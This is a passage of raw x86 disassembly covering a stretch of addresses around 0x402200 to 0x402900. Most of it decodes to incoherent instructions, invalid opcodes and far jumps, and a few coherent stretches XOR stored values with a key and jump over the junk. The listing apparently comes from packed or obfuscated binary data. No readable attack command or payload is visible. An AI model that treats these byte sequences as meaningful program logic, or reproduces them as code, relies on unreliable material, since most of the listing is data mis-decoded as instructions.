  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	nop
  40216a:	push   ss
  40216b:	loop   0x4021d4
  40216d:	push   ds
  40216e:	add    bh,BYTE PTR [esi+0x7e]
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x4021b2
  402176:	sbb    edx,DWORD PTR [eax]
  402178:	ret    
  402179:	sub    eax,0xb92228bd
  40217e:	sbb    DWORD PTR [edi],ecx
  402180:	jae    0x402108
  402182:	test   eax,0xb5bcc9de
  402187:	mov    ebx,0xf970eb78
  40218c:	dec    esp
  40218d:	adc    DWORD PTR [edi],ebp
  40218f:	push   0xffffffd9
  402191:	outs   dx,BYTE PTR ds:[esi]
  402192:	loopne 0x402118
  402194:	cmc    
  402195:	das    
  402196:	xor    DWORD PTR [edx+edx*2],0x7eb64e3e
  40219d:	adc    al,0x9e
  40219f:	scas   eax,DWORD PTR es:[edi]
  4021a0:	stos   BYTE PTR es:[edi],al
  4021a1:	pop    ss
  4021a2:	pop    edx
  4021a3:	cmp    al,0x87
  4021a5:	or     ebx,DWORD PTR [edi+0x3af79c51]
  4021ab:	xchg   edx,eax
  4021ac:	mov    bl,0x17
  4021af:	test   DWORD PTR [edx+0x62],0xf630da5c
  4021b6:	into   
  4021b7:	out    0x92,eax
  4021b9:	lds    eax,FWORD PTR [edi+0x63]
  4021bc:	in     eax,dx
  4021bd:	mov    esp,0xe5eaedea
  4021c2:	jecxz  0x4021b0
  4021c4:	push   0xb59f0c9b
  4021c9:	sub    al,0x13
  4021cb:	jecxz  0x402232
  4021cd:	mov    cl,0xb8
  4021cf:	test   bl,ch
  4021d1:	jle    0x40220c
  4021d3:	add    eax,0x9c1c8a8d
  4021d8:	cli    
  4021d9:	ds mov edi,0x8ce9ed49
  4021df:	push   ds
  4021e0:	(bad)  
  4021e1:	retw   
  4021e3:	jmp    0x402233
  4021e5:	cmp    BYTE PTR [edx-0x7a1f6b2c],ah
  4021eb:	jl     0x4021c6
  4021ed:	xor    bl,BYTE PTR [edx]
  4021ef:	or     edi,edx
  4021f1:	sahf   
  4021f2:	int3   
  4021f3:	mov    dl,0xd1
  4021f5:	mov    WORD PTR [ecx],es
  4021f7:	push   eax
  4021f8:	pop    ds
  4021f9:	xor    esi,DWORD PTR [edi]
  4021fb:	xlat   BYTE PTR ds:[ebx]
  4021fc:	mov    ds:0x7de05a0c,al
  402201:	mov    ebx,0xa62f6e3d
  402206:	sbb    dl,bl
  402208:	adc    DWORD PTR [eax],ebp
  40220a:	hlt    
  40220b:	mov    ah,0x2b
  40220d:	aam    0x4a
  40220f:	lahf   
  402210:	sub    dl,BYTE PTR [eax]
  402212:	dec    edx
  402213:	jmp    0xa74d:0xe6947fcc
  40221a:	jmp    0x5f96ae8a
  40221f:	cmp    DWORD PTR [edx-0x66],edx
  402222:	xchg   edx,eax
  402223:	xchg   edi,eax
  402224:	xchg   ecx,eax
  402225:	cmp    eax,0x7c0d7683
  40222b:	ss push 0xffffffcf
  40222e:	(bad)  
  40222f:	imul   edi,DWORD PTR ds:0x38cebb0a,0x7e
  402236:	pop    edx
  402237:	lods   al,BYTE PTR ds:[esi]
  402238:	(bad)  
  402239:	push   edx
  40223a:	repnz retf 0xe27
  40223e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40223f:	dec    ecx
  402240:	retf   
  402241:	add    eax,0xa6df6c3e
  402246:	scas   al,BYTE PTR es:[edi]
  402247:	jmp    0xe47d34f0
  40224c:	enter  0x8409,0xc
  402250:	inc    edx
  402251:	sub    al,0xde
  402253:	pop    ebx
  402254:	push   esp
  402255:	addr16 cwde 
  402257:	push   0xcf775a0
  40225c:	(bad)  
  40225d:	push   ecx
  40225e:	push   esi
  40225f:	into   
  402260:	les    esp,FWORD PTR [esi]
  402262:	xchg   ebp,eax
  402263:	dec    esi
  402264:	jmp    0xec53:0x9360af1d
  40226b:	mov    bl,0x3c
  40226d:	xor    BYTE PTR [ecx],bl
  40226f:	sti    
  402270:	call   0x7947:0xfe078492
  402277:	inc    ebx
  402278:	in     al,0xd6
  40227a:	mov    eax,ds:0xa5f9764a
  40227f:	fnsave [ecx-0x7b]
  402282:	jp     0x4022bc
  402284:	jbe    0x402221
  402286:	scas   al,BYTE PTR es:[edi]
  402287:	push   ebx
  402288:	jmp    0x6dc0:0x1f60298e
  40228f:	mov    ebx,0x54c30e23
  402294:	and    eax,0xab2e82c8
  402299:	fldcw  WORD PTR [ebp+0x8]
  40229c:	jb     0x4022d7
  40229e:	test   DWORD PTR [ebx+0x2345c6ef],0x107dfb9a
  4022a8:	mov    bh,0x64
  4022aa:	cmp    DWORD PTR [ecx-0x51175bb2],ebx
  4022b0:	sub    BYTE PTR [edi+ebp*4-0x40],ah
  4022b4:	mov    dl,0x72
  4022b6:	push   cs
  4022b7:	sbb    al,cl
  4022b9:	rcr    esi,0x1c
  4022bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022bd:	in     al,0xfd
  4022bf:	and    al,0x2
  4022c1:	ins    BYTE PTR es:[edi],dx
  4022c2:	push   es
  4022c3:	leave  
  4022c4:	pusha  
  4022c5:	inc    eax
  4022c6:	ret    
  4022c7:	xchg   esi,eax
  4022c8:	popa   
  4022c9:	(bad)  
  4022ca:	out    dx,al
  4022cb:	add    esi,DWORD PTR [eax-0x70890414]
  4022d1:	dec    esi
  4022d2:	cmp    eax,ecx
  4022d4:	fbld   TBYTE PTR [eax-0x4e792df7]
  4022da:	mov    bl,BYTE PTR [ebp+0x1268f337]
  4022e0:	bsr    esi,ebx
  4022e3:	hlt    
  4022e4:	ret    0x20cb
  4022e7:	loope  0x402349
  4022e9:	xchg   esp,eax
  4022ea:	mov    ecx,0x7ab28cbc
  4022ef:	lahf   
  4022f0:	bound  ebx,QWORD PTR es:[ebx-0x63]
  4022f4:	sbb    al,BYTE PTR [ebp+0x44]
  4022f7:	stc    
  4022f8:	add    DWORD PTR [eax-0x75],edx
  4022fb:	inc    ebp
  4022fc:	call   0x1d8a38c
  402301:	add    BYTE PTR [eax],al
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	retf   
  402358:	push   edx
  402359:	retf   0x9a68
  40235c:	add    edi,DWORD PTR [esi+0x7e]
  40235f:	cli    
  402360:	jg     0x4023e0
  402362:	jle    0x4023d4
  402364:	push   ebp
  402365:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402366:	daa    
  402367:	sbb    edi,DWORD PTR [ecx+esi*2]
  40236a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40236b:	dec    cl
  40236d:	jecxz  0x40231d
  40236f:	dec    ebx
  402370:	xor    al,0xa7
  402372:	xor    eax,0x17488eb1
  402377:	mov    ebp,?
  402379:	sti    
  40237a:	std    
  40237b:	push   ds
  40237c:	pop    ebx
  40237d:	or     al,bl
  40237f:	adc    al,0x5a
  402381:	ret    
  402382:	call   0x21e80ce0
  402387:	jge    0x4023d0
  402389:	or     BYTE PTR [ebx],ah
  40238b:	sub    eax,0x5f522f13
  402390:	jmp    0x402326
  402392:	pop    edx
  402393:	ins    BYTE PTR es:[edi],dx
  402394:	int    0x8e
  402396:	aam    0x5c
  402398:	pop    ebx
  402399:	pop    esp
  40239a:	jbe    0x402356
  40239c:	hlt    
  40239d:	popf   
  40239e:	jno    0x402393
  4023a0:	xor    DWORD PTR [ecx],esp
  4023a2:	icebp  
  4023a3:	xchg   dl,bh
  4023a5:	add    DWORD PTR [ebx+0x3d],ecx
  4023a8:	ret    0xff56
  4023ab:	pop    ds
  4023ac:	in     al,dx
  4023ad:	push   esi
  4023ae:	push   edi
  4023af:	pop    ds
  4023b0:	pop    eax
  4023b1:	inc    edx
  4023b2:	or     al,0xf4
  4023b4:	add    eax,0x65fc3834
  4023b9:	xor    BYTE PTR [ebx+esi*4+0x6a],dh
  4023bd:	fist   WORD PTR [ebx+0x17b105c]
  4023c3:	cmp    eax,0xcd075ffb
  4023c8:	and    DWORD PTR [ebp+ecx*4+0x1b137ece],ecx
  4023cf:	rcr    DWORD PTR [eax+edi*8+0x16],0x13
  4023d4:	call   0x44ec128f
  4023d9:	mov    al,gs:0xe48a62c3
  4023df:	call   0x483d5737
  4023e4:	jle    0x4023a3
  4023e6:	cmp    DWORD PTR [ecx+0x4ba7cb7f],0x2e70fd0d
  4023f0:	cdq    
  4023f1:	ins    DWORD PTR es:[edi],dx
  4023f2:	push   ebx
  4023f3:	pop    ecx
  4023f4:	xchg   ecx,eax
  4023f5:	push   edi
  4023f6:	fisub  WORD PTR ds:0x1e6dbcb0
  4023fc:	ret    0xc17b
  4023ff:	adc    al,0xf7
  402401:	loope  0x4023d5
  402403:	hlt    
  402404:	das    
  402405:	bound  ecx,QWORD PTR [eax-0x3f]
  402408:	call   0x3fa:0xb9c57e57
  40240f:	mov    ds:0x4bdaba09,al
  402414:	call   0xa2fffd2d
  402419:	adc    bh,bl
  40241b:	jb     0x40248a
  40241d:	call   0x329649aa
  402422:	and    ah,ah
  402424:	mov    bh,0xe3
  402426:	xchg   esi,eax
  402427:	ror    BYTE PTR [ebp+0x4518df92],cl
  40242d:	cwde   
  40242e:	inc    edi
  40242f:	or     al,0xff
  402431:	into   
  402432:	cmc    
  402433:	rcr    BYTE PTR [edi-0x7de1826a],0x57
  40243a:	cmp    cl,BYTE PTR [ebx+edx*1]
  40243d:	fstp   DWORD PTR [ecx+0x27]
  402440:	mov    ch,0xb3
  402442:	sti    
  402443:	push   cs
  402444:	adc    ebx,DWORD PTR [ebp+0x25]
  402447:	aad    0x19
  402449:	mov    ch,BYTE PTR [eax-0x3]
  40244c:	dec    edx
  40244d:	sbb    BYTE PTR [edx+0x7d023ca0],dl
  402453:	(bad)  
  402454:	mov    dh,0xdc
  402456:	add    edi,edx
  402458:	lea    edx,[eax]
  40245a:	and    bl,dh
  40245c:	sub    ah,bl
  40245e:	xchg   edx,eax
  40245f:	(bad)  
  402460:	push   ss
  402461:	mov    ah,0xae
  402463:	aam    0x96
  402465:	popa   
  402466:	push   0xfffffff6
  402468:	cmc    
  402469:	add    DWORD PTR [edi],esp
  40246b:	cdq    
  40246c:	add    al,0x63
  40246e:	jnp    0x402493
  402470:	rol    DWORD PTR [ecx],0x1e
  402473:	or     eax,0x8c294095
  402478:	dec    esp
  402479:	cdq    
  40247a:	fs inc ebx
  40247c:	mov    ah,0x88
  40247e:	lea    eax,[eax]
  402480:	mov    dl,0xf7
  402482:	add    DWORD PTR [ecx-0x30ce3eec],0xd1cfe31f
  40248c:	inc    ebp
  40248d:	add    eax,0xae686ebd
  402492:	sub    esp,DWORD PTR [eax+edi*8-0x24]
  402496:	ret    0xdd37
  402499:	inc    edx
  40249a:	xchg   edx,eax
  40249b:	in     al,0x2d
  40249d:	call   0xf650:0x6bbaffa0
  4024a4:	jp     0x402479
  4024a6:	jnp    0x4024ae
  4024a8:	inc    eax
  4024a9:	je     0x402441
  4024ab:	dec    ecx
  4024ac:	xor    ebx,eax
  4024ae:	mov    ds:0xae9d5d03,eax
  4024b3:	jno    0x40245c
  4024b5:	mov    dh,0x13
  4024b7:	jg     0x4024dd
  4024b9:	sar    DWORD PTR [edi],0x20
  4024bc:	inc    ebp
  4024bd:	xchg   ebx,eax
  4024be:	adc    dh,BYTE PTR [ecx+0x6a]
  4024c1:	lock aam 0xd3
  4024c4:	icebp  
  4024c5:	fist   WORD PTR [esi]
  4024c7:	xchg   edx,eax
  4024c8:	pop    edi
  4024c9:	add    dl,dl
  4024cb:	sub    ecx,DWORD PTR es:[ebx-0x43]
  4024cf:	push   0x7f
  4024d1:	sbb    edx,edx
  4024d3:	loop   0x402543
  4024d5:	sub    al,0x45
  4024d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024d8:	outs   dx,BYTE PTR ds:[esi]
  4024d9:	in     eax,dx
  4024da:	test   DWORD PTR [edi+0x57c67733],ebp
  4024e0:	or     DWORD PTR [eax],edi
  4024e2:	jmp    0x61b6d85f
  4024e7:	mov    eax,DWORD PTR [ebp-0x10]
  4024ea:	mov    DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	add    esp,ebx
  40250f:	mov    WORD PTR [edi+0x26],?
  402512:	add    DWORD PTR [esi+0x7e],edi
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x402540
  40251a:	jnp    0x4024d0
  40251c:	not    ch
  40251e:	cmp    DWORD PTR [edi],esi
  402520:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402521:	nop
  402522:	jge    0x40251a
  402524:	es jp  0x402576
  402527:	lock (bad) 
  402529:	fcmovu st,st(7)
  40252b:	loopne 0x4024af
  40252d:	mov    ecx,esi
  40252f:	xor    BYTE PTR [edx+0x30c1b358],ah
  402535:	mov    edx,0xc02f73a2
  40253a:	push   eax
  40253b:	lods   al,BYTE PTR ds:[esi]
  40253d:	int    0x4b
  40253f:	jbe    0x402590
  402541:	xchg   edx,eax
  402542:	inc    eax
  402543:	rcl    BYTE PTR [ebx-0x1a],0xe1
  402547:	sti    
  402548:	xchg   edi,eax
  402549:	in     al,dx
  40254a:	test   BYTE PTR [esi],cl
  40254c:	push   ebx
  40254d:	test   edx,edi
  40254f:	push   ebx
  402550:	cmc    
  402551:	xlat   BYTE PTR ds:[ebx]
  402552:	stos   BYTE PTR es:[edi],al
  402553:	add    eax,0xf99b8a2c
  402558:	int3   
  402559:	xchg   BYTE PTR [edi],al
  40255b:	add    dl,dh
  40255d:	mov    DWORD PTR [esi+eax*1],edx
  402560:	fcmovb st,st(4)
  402562:	add    BYTE PTR [edi],bl
  402564:	pop    eax
  402565:	push   eax
  402566:	add    BYTE PTR [edi+0x2e],cl
  402569:	inc    ebx
  40256a:	jmp    0x8cbb:0x9b669217
  402571:	mov    ah,BYTE PTR [ecx-0x27343090]
  402577:	and    al,0x64
  402579:	push   es
  40257a:	sbb    al,0xb6
  40257c:	jle    0x4025de
  40257e:	xchg   esp,eax
  40257f:	frstpm(287 only) 
  402581:	pop    ss
  402582:	sahf   
  402583:	push   ds
  402584:	aaa    
  402585:	cmc    
  402586:	clc    
  402587:	popa   
  402588:	and    DWORD PTR [edx-0x6a9821df],ebx
  40258e:	cdq    
  40258f:	cmp    BYTE PTR [ebx-0x52],ah
  402592:	inc    esp
  402593:	pop    eax
  402594:	cmc    
  402595:	jne    0x402560
  402597:	out    0x5e,al
  402599:	mov    al,0xe9
  40259b:	xchg   DWORD PTR [edx-0x1027761b],edx
  4025a1:	cmc    
  4025a2:	(bad)  
  4025a3:	in     eax,dx
  4025a4:	and    BYTE PTR [edx+0x2a],cl
  4025a7:	mov    eax,gs:0x53902cfe
  4025ad:	and    DWORD PTR ds:0x278bb00a,ebp
  4025b3:	sub    BYTE PTR [ebp-0x25],ch
  4025b6:	sub    cl,dh
  4025b8:	cli    
  4025b9:	dec    ebp
  4025ba:	xchg   ecx,eax
  4025bb:	push   cs
  4025bc:	xchg   ebx,eax
  4025bd:	outs   dx,BYTE PTR ds:[esi]
  4025be:	into   
  4025bf:	push   esi
  4025c0:	push   eax
  4025c1:	push   cs
  4025c2:	js     0x402565
  4025c4:	test   al,0x2b
  4025c6:	idiv   BYTE PTR [ebx+ebx*1]
  4025c9:	adc    edi,edi
  4025cb:	stos   BYTE PTR es:[edi],al
  4025cc:	cmp    DWORD PTR [edi+0x241942d7],edx
  4025d2:	aas    
  4025d3:	shr    DWORD PTR [edi],cl
  4025d5:	adc    DWORD PTR [esi+eax*8-0x6b4a8575],esp
  4025dc:	les    ecx,FWORD PTR [esi]
  4025de:	popf   
  4025df:	xchg   edi,eax
  4025e0:	jae    0x4025d4
  4025e2:	pop    edi
  4025e3:	stos   BYTE PTR es:[edi],al
  4025e4:	test   BYTE PTR [ebx-0x2f],0x5c
  4025e8:	jecxz  0x4025d0
  4025ea:	inc    ebx
  4025eb:	and    BYTE PTR [eax-0x7a3d3aef],bl
  4025f1:	adc    dl,ch
  4025f3:	add    cl,BYTE PTR [edx]
  4025f5:	mov    WORD PTR [ebx+0xa],gs
  4025f8:	inc    ebx
  4025f9:	test   DWORD PTR ss:[ebx+0x64],edi
  4025fd:	pop    ss
  4025fe:	jle    0x40262c
  402600:	jmp    0x4025eb
  402602:	mov    esp,0x1b6b2746
  402607:	sbb    eax,0x6a583661
  40260c:	or     dl,BYTE PTR [esi+0x5f]
  40260f:	adc    dh,ch
  402611:	push   ebp
  402612:	push   eax
  402613:	iret   
  402614:	stc    
  402615:	xor    eax,0xa26f3170
  40261a:	test   DWORD PTR [ecx],eax
  40261c:	jmp    0x25c4:0x358fe5d2
  402623:	dec    edx
  402624:	js     0x40260c
  402626:	fcomip st,st(7)
  402628:	mov    dh,0x85
  40262a:	xor    BYTE PTR [edi-0x5b],0x51
  40262e:	sbb    ebp,esp
  402630:	shl    al,1
  402632:	xor    esi,edx
  402634:	mov    DWORD PTR [eax],esi
  402636:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402637:	push   ds
  402638:	push   ss
  402639:	cmp    eax,0xcc625227
  40263e:	dec    ebp
  40263f:	cmp    eax,0x132e7086
  402644:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402645:	xor    BYTE PTR [ebx+0x11a8e256],ah
  40264b:	jg     0x40267f
  40264d:	dec    eax
  40264e:	sub    eax,0x4782d416
  402653:	mov    edi,0xe93ae616
  402658:	stos   DWORD PTR es:[edi],eax
  402659:	lea    edx,[esi-0x5e]
  40265c:	(bad)  
  40265e:	inc    esp
  40265f:	rcl    BYTE PTR [eax-0x170078c5],cl
  402665:	inc    ebx
  402666:	outs   dx,DWORD PTR ds:[esi]
  402667:	add    al,0x98
  402669:	mov    eax,ds:0xd4bf4dff
  40266e:	lock ds jle 0x4025f5
  402672:	nop
  402673:	out    0xe2,al
  402675:	into   
  402676:	or     DWORD PTR [ebx-0x25b3d9f8],eax
  40267c:	call   FWORD PTR [edx+0x17]
  40267f:	jmp    0x4026f3
  402681:	cdq    
  402682:	inc    esp
  402683:	push   ebp
  402684:	ror    BYTE PTR [edi+eax*2-0x56],1
  402688:	and    esi,ebp
  40268a:	sub    ah,BYTE PTR [edx]
  40268c:	and    eax,ebx
  40268e:	xor    esp,DWORD PTR [ebx]
  402690:	addr16 cli 
  402692:	loope  0x4026c8
  402694:	jp     0x4026ac
  402696:	jne    0x4026f3
  402698:	xchg   edx,eax
  402699:	je     0x40264c
  40269b:	pop    es
  40269c:	icebp  
  40269d:	xor    eax,esi
  40269f:	add    eax,0x32729b
  4026a4:	mov    DWORD PTR [ecx],eax
  4026a6:	mov    eax,DWORD PTR [ebp-0x24]
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	sub    eax,0xa23729e5
  4026d7:	push   cs
  4026d8:	jle    0x402758
  4026da:	cli    
  4026db:	jg     0x40275b
  4026dd:	jle    0x4026db
  4026df:	xor    eax,0xcc6cefc8
  4026e4:	xchg   edx,eax
  4026e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026e6:	test   eax,0xb2e5ff48
  4026eb:	or     eax,0x3046cb21
  4026f0:	dec    esi
  4026f1:	add    DWORD PTR [esi+0xe],esi
  4026f4:	jge    0x40274a
  4026f6:	mov    ds:0x6a5becc1,al
  4026fb:	add    BYTE PTR [edx-0x1c746ff2],dl
  402701:	xor    ebp,esi
  402703:	call   0x6c4c421a
  402708:	push   ecx
  402709:	dec    ecx
  40270a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40270b:	(bad)  
  40270c:	mov    eax,ds:0x2ff3099b
  402711:	into   
  402712:	aad    0xd4
  402714:	aam    0x83
  402716:	fxch   st(3)
  402718:	ret    
  402719:	aam    0x94
  40271b:	dec    ecx
  40271c:	ins    DWORD PTR es:[edi],dx
  40271d:	(bad)  
  40271e:	out    dx,al
  40271f:	xor    edi,ebx
  402721:	xchg   edx,eax
  402722:	push   edi
  402723:	pop    edi
  402724:	cdq    
  402725:	jb     0x402744
  402727:	ret    
  402728:	add    al,0x9c
  40272a:	adc    DWORD PTR [ebx+esi*4+0x4947aed2],eax
  402731:	fsubp  st(0),st
  402733:	aaa    
  402734:	push   ss
  402735:	ins    DWORD PTR es:[edi],dx
  402736:	add    cl,BYTE PTR [edx+eax*1-0x4c]
  40273a:	pushf  
  40273b:	cwde   
  40273c:	js     0x4026ea
  40273e:	push   edi
  40273f:	add    ah,BYTE PTR [esi-0x6f]
  402742:	aas    
  402743:	sbb    BYTE PTR [ebx+0x5c],bh
  402746:	push   ebp
  402747:	push   ebp
  402748:	hlt    
  402749:	add    edx,ebx
  40274b:	mov    cl,0x9d
  40274d:	imul   eax
  40274f:	mov    dh,0x3d
  402751:	and    al,0xac
  402753:	in     eax,dx
  402754:	arpl   WORD PTR fs:[edx],si
  402757:	call   0xdd38:0xcec6a1e
  40275e:	adc    ebp,0xb131b63a
  402764:	xchg   edi,eax
  402765:	mov    ah,0xa8
  402767:	push   0x342c697a
  40276c:	cwde   
  40276d:	call   0xb370:0x68f1b4b5
  402774:	sbb    DWORD PTR [esi+0x55],0x3f
  402778:	push   esp
  402779:	call   0xa68406e3
  40277e:	cld    
  40277f:	xchg   esi,eax
  402780:	or     bl,BYTE PTR [esi-0x7de1e81d]
  402786:	stos   BYTE PTR es:[edi],al
  402787:	jns    0x402772
  402789:	loop   0x402772
  40278b:	mov    dh,BYTE PTR [esi]
  40278d:	xchg   ebx,eax
  40278e:	inc    ecx
  40278f:	mov    eax,ds:0x86984017
  402794:	repnz and edx,DWORD PTR [edi]
  402797:	(bad)  
  402798:	scas   al,BYTE PTR es:[edi]
  402799:	xor    DWORD PTR [ebp+0x132f4699],edi
  40279f:	imul   edx,DWORD PTR [ebp+0x2c2a42ea],0xe708ce07
  4027a9:	nop
  4027aa:	or     dl,ch
  4027ac:	scas   al,BYTE PTR es:[edi]
  4027ad:	xchg   edx,eax
  4027ae:	lock sti 
  4027b0:	out    dx,al
  4027b1:	outs   dx,DWORD PTR ds:[esi]
  4027b2:	mov    bl,0x8c
  4027b4:	mov    al,0x60
  4027b6:	ror    esi,0x30
  4027b9:	mov    WORD PTR [ecx+0x600cb999],gs
  4027bf:	enter  0x418f,0x14
  4027c3:	push   0xffffffcb
  4027c5:	and    al,0x85
  4027c7:	jno    0x402757
  4027c9:	ja     0x402797
  4027cb:	adc    DWORD PTR [ecx+0x36],ebp
  4027ce:	push   ecx
  4027cf:	add    esi,ecx
  4027d1:	jno    0x40278f
  4027d3:	mov    eax,0x6c0377ed
  4027d8:	mov    ds:0xafe27e70,al
  4027dd:	xchg   BYTE PTR [eax+0x3d405604],dh
  4027e3:	retf   
  4027e4:	xchg   ecx,eax
  4027e5:	add    DWORD PTR ds:0xdebe7b8e,ebp
  4027eb:	fwait
  4027ec:	clc    
  4027ed:	je     0x4027ed
  4027ef:	or     DWORD PTR [edi+0x49],ebp
  4027f2:	xlat   BYTE PTR ds:[ebx]
  4027f3:	scas   eax,DWORD PTR es:[edi]
  4027f4:	jle    0x36748372
  4027fa:	mov    ds:0x1e8b18c7,eax
  4027ff:	sbb    eax,0xb6cce853
  402804:	popf   
  402805:	dec    esi
  402806:	push   esp
  402807:	mov    edx,DWORD PTR [ecx]
  402809:	xchg   edi,eax
  40280a:	jne    0x4027a2
  40280c:	ret    0x57c2
  40280f:	outs   dx,BYTE PTR ds:[esi]
  402810:	jl     0x402873
  402812:	stos   DWORD PTR es:[edi],eax
  402813:	adc    eax,0xde3517bd
  402818:	dec    esp
  402819:	cmp    ah,cl
  40281b:	adc    ebx,DWORD PTR [ecx]
  40281d:	push   edi
  40281e:	pop    es
  40281f:	std    
  402820:	data16 mov ah,0x47
  402823:	sbb    dh,BYTE PTR [edi+0x1d966d4]
  402829:	stos   DWORD PTR es:[edi],eax
  40282a:	call   0x65f3:0x781869e4
  402831:	sub    al,0x29
  402833:	in     eax,0x7f
  402835:	in     al,dx
  402836:	xchg   edx,eax
  402837:	and    bl,BYTE PTR ds:0x3960ec08
  40283d:	sbb    DWORD PTR [ebp+0x51b7754f],0xf9e0b1c9
  402847:	ds inc edx
  402849:	mov    bh,0xa7
  40284b:	push   0xa4a0291d
  402850:	sbb    al,0x24
  402852:	add    dl,bh
  402854:	sub    esi,DWORD PTR [ebp-0x2a]
  402857:	adc    dl,BYTE PTR [eax+0x4fb4ccec]
  40285d:	dec    ebx
  40285e:	stc    
  40285f:	and    al,0xb9
  402861:	jmp    0x4027ee
  402863:	inc    ebp
  402864:	ror    BYTE PTR [ebx+0x4189f84d],1
  40286a:	adc    BYTE PTR [ebx-0x23ba7440],cl
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	cmp    al,0x48
  402885:	lods   eax,DWORD PTR ds:[esi]
  402886:	sub    DWORD PTR [esi],ebp
  402888:	or     al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x402832
  402890:	stos   BYTE PTR es:[edi],al
  402891:	push   DWORD PTR [ecx+0x3e]
  402894:	pop    esp
  402895:	and    BYTE PTR [ecx+0x1a],bl
  402898:	sub    DWORD PTR [edi+0x4801069],esi
  40289e:	jne    0x4028b8
  4028a0:	jmp    0x4028bf
  4028a2:	and    DWORD PTR [edx+ebp*4-0x5b1c9596],0x665baea8
  4028ad:	add    eax,0xffe173ff
  4028b2:	and    edi,DWORD PTR [edi+0x27]
  4028b5:	sti    
  4028b6:	sbb    eax,0xbe65010e
  4028bb:	mov    ds:0x5048f16e,eax
  4028c0:	jne    0x402872
  4028c2:	dec    edi
  4028c3:	push   esp
  4028c4:	repz push es
  4028c6:	xchg   BYTE PTR [edx+0x21],dl
  4028c9:	and    bl,BYTE PTR [edx+0x10]
  4028cc:	push   ebx
  4028cd:	out    0xd6,eax
  4028cf:	call   0x79a11340
  4028d4:	and    eax,0x75adb372
  4028d9:	cld    
  4028da:	loop   0x402910
  4028dc:	inc    ebp
  4028dd:	xchg   ebx,eax
  4028de:	push   ebp
  4028df:	push   ds
  4028e0:	jge    0x4028e2
  4028e2:	jmp    0x40294e
  4028e4:	cmp    BYTE PTR [ebx+ebx*2+0x1772414e],bl
  4028eb:	cs mov ch,0x36
  4028ee:	cdq    
  4028ef:	icebp  
  4028f0:	sbb    ah,dh
  4028f2:	lea    edx,[esi]
  4028f4:	mov    eax,0x612cf797
  4028f9:	mov    bl,0x54
  4028fb:	push   cs
  4028fc:	loop   0x402946
  4028fe:	lock fimul WORD PTR [eax-0x7]
  402902:	mov    dh,BYTE PTR [edi]
  402904:	(bad)  
  402906:	addr16 popa 
  402908:	sbb    BYTE PTR [ecx+edi*1+0x7],bh
  40290c:	dec    esi
  40290d:	(bad)  
  40290e:	mov    ecx,0x2dc1d745
  402913:	adc    edx,edi
  402915:	inc    ebp
  402916:	jnp    0x4028e9
  402918:	fild   DWORD PTR [edi+0x7d60f31e]
  40291e:	jbe    0x402903
  402920:	not    edx
  402922:	ja     0x40295e
  402924:	sub    al,0xa7
  402926:	ror    BYTE PTR [edi-0x14],cl
  402929:	add    edi,DWORD PTR [esi-0x51915a]
  40292f:	push   ebx
  402930:	ret    0xd62e
  402933:	sbb    dl,BYTE PTR [ecx+ecx*4+0x7e]
  402937:	inc    ebx
  402938:	mov    edi,0xa21c3eb8
